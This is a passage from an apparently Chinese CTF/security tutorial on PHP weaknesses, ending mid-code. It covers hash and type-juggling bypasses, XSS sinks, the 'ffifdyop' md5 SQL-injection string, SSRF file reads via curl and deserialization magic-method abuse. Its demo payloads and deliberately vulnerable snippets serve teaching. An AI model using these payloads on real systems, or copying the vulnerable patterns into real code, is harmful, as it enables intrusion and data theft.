<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($a,$b))&#123;</span><br><span class="line">		<span class="keyword">if</span>(sha1($a) === sha1($b))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'nice!!!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Try again!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们传入<code>a[]=1&amp;b[]=2</code>的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了<code>nice!!!</code>，所以我们完全可以用数字来绕过<code>sha1()</code>函数的比较。</p>
<h4 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h4><p>我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric( mixed $var) : bool</span><br></pre></td></tr></table></figure>

<p>如果<code>var</code>是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = is_numeric(<span class="string">'0x31206f722031'</span>);</span><br><span class="line">	<span class="keyword">if</span>($a)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'It meets my requirement'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">It meets my requirement</span><br></pre></td></tr></table></figure>

<p>这里说一下<code>0x31206f722031</code>这个是什么？这个是<code>or 1=1</code>的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。</p>
<h4 id="in-array-绕过"><a href="#in-array-绕过" class="headerlink" title="in_array()绕过"></a>in_array()绕过</h4><p>此函数用来检测数组中是否存在某个值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array( mixed $needle, <span class="keyword">array</span> $haystack[, bool $strict = <span class="keyword">FALSE</span>] ) : bool</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>needle：带搜索的值(区分大小写)。</li>
<li>haystack：带搜索的数组。</li>
<li>strict：若此参数的值为TRUE，那么<code>in_array()</code>函数将会检查needle的类型是否和haystack中的类型相同。</li>
</ul>
<p>有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $myarr = <span class="keyword">array</span>(<span class="string">'Ameng'</span>);</span><br><span class="line">	$needle = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(in_array($needle,$myarr))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"It's in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"not in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出<code>not in array</code>，但是实际却输出了<code>It&#39;s in array</code>。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为<code>true</code>那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">print</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$str"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	printf($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = sprintf($str);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h4><p>此函数输出一条信息，并退出当前脚本。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">die</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h4><p>此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-export"><a href="#var-export" class="headerlink" title="var_export()"></a>var_export()</h4><p>此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和<code>var_dump</code>类似，不同的是其返回的表示是合法的 PHP 代码。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_export($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP黑魔法"><a href="#PHP黑魔法" class="headerlink" title="PHP黑魔法"></a>PHP黑魔法</h3><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p><code>md5()</code>函数绕过sql注入。我们来看一个例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提交的参数通过<code>md5</code>函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了<code>&#39;or&#39;xxxx</code>的格式，不就可以注入了么。<code>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</code></p>
<p>转成字符串为<code>&#39;or&#39;6xxx</code></p>
<h4 id="eval-1"><a href="#eval-1" class="headerlink" title="eval()"></a>eval()</h4><p>在执行命令时，可使用分号构造处多条语句。类似这种。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = <span class="string">"echo 'a';echo '--------------';echo 'b';"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">eval</span>($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><p>存在<code>%00</code>截断，当遇到使用此函数来进行正则匹配时，我们可以用<code>%00</code>来截断正则匹配，从而绕过正则。</p>
<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>这个在前面介绍过，就是数组绕过技巧。</p>
<h4 id="curl-setopt"><a href="#curl-setopt" class="headerlink" title="curl_setopt()"></a>curl_setopt()</h4><p>存在ssrf漏洞。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'Ameng'</span>]);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//使用file协议进行任意文件读取</span></span><br><span class="line"><span class="comment">//1.php?Ameng=file:///D:/phpstudy_pro/WWW/demo.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="preg-replace-1"><a href="#preg-replace-1" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数前面详细介绍过，/e模式下的命令执行。</p>
<h4 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h4><p>url二次编码绕过。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = urldecode($_GET[<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($name = <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Plase~"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将Ameng进行二次url编码，然后传入即可得到满足条件。</p>
<h4 id="file-get-contents-1"><a href="#file-get-contents-1" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>常用伪协议来进行绕过。</p>
<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h4><p>此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$url = <span class="string">"http://www.jlx-love.com/about"</span>;</span><br><span class="line">	$parts = parse_url($url);</span><br><span class="line">	print_r($parts);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">执行结果——&gt;</span><br><span class="line"><span class="keyword">Array</span> </span><br><span class="line">    ( </span><br><span class="line">    [scheme] =&gt; http </span><br><span class="line">    [host] =&gt; www.jlx-love.com 		[path] =&gt; /about </span><br><span class="line">	)</span><br></pre></td></tr></table></figure>

<p>可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\转换为/，从而就会导致<code>parse_url</code>的白名单绕过。</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。</p>
<p>序列化：把对象转换为字节序列的过程成为对象的序列化。</p>
<p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化。</p>
<p>归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。</p>
<p>在 PHP 中主要就是通过<code>serialize</code>和<code>unserialize</code>来实现数据的序列化和反序列化。</p>
<p>那么漏洞是如何形成的呢？</p>
<p>PHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。</p>
<p>那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $who = <span class="string">"Ameng"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = serialize(<span class="keyword">new</span> Ameng);</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">O:<span class="number">5</span>:<span class="string">"Ameng"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"who"</span>;s:<span class="number">5</span>:<span class="string">"Ameng"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210425/16193177504420.png" alt="image-20210423051113545"></p>
<p>这里还要补充一点，就是关于变量的分类，变量的类别有三种：</p>
<ul>
<li>public：正常操作，在反序列化时原型就行。</li>
<li>protected：反序列化时在变量名前加上%00*%00。</li>
<li>private：反序列化时在变量名前加上%00类名%00。</li>
</ul>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>在我们反序列化时，会先检查类中是否存在<code>__wakeup()</code>如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>执行<code>__destruct()</code>。</p>
<p>影响版本：</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct执行&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="string">'1.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$data = <span class="string">'O:5:"Ameng":2:&#123;s:4:"name";s:5:"2.php";&#125;'</span>;</span><br><span class="line">	unserialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//destruct执行</span></span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p><code>__sleep()</code>函数刚好与<code>__waeup()</code>相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"sleep()执行&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"over&lt;br&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;         </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng(<span class="string">"2.php"</span>);</span><br><span class="line">	$b = serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//sleep()执行</span></span><br><span class="line"><span class="comment">//OVER</span></span><br></pre></td></tr></table></figure>

<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>这个函数的作用在<code>__sleep()</code>也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在<code>__sleep()</code>中用这个函数来对变量进行赋值。</p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么<code>__call</code>就会被自动调用</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"call执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"callStatic执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng;</span><br><span class="line">	$a-&gt;b();</span><br><span class="line">	Ameng::b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//call执行失败</span></span><br><span class="line"><span class="comment">//callStatic执行失败</span></span><br></pre></td></tr></table></figure>

<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。</p>
<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。</p>
<p>get方法用来获取私有成员属性的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__get()方法用来获取私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要获取成员属性的名称。</li>
</ul>
<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>此方法用来给私有成员属性赋值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__set()方法用来设置私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;$name = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要赋值的属性名。</li>
<li>$value：给属性赋值的值。</li>
</ul>
<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>这个函数是当我们对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时调用。</p>
<p>在这之前我们要先了解一下<code>isset()</code>函数的使用。<code>isset()</code>函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？</p>
<p>若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上<code>__isset()</code>方法，接下来就可以使用<code>isset()</code>在对象外面访问对象里面的私有成员了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 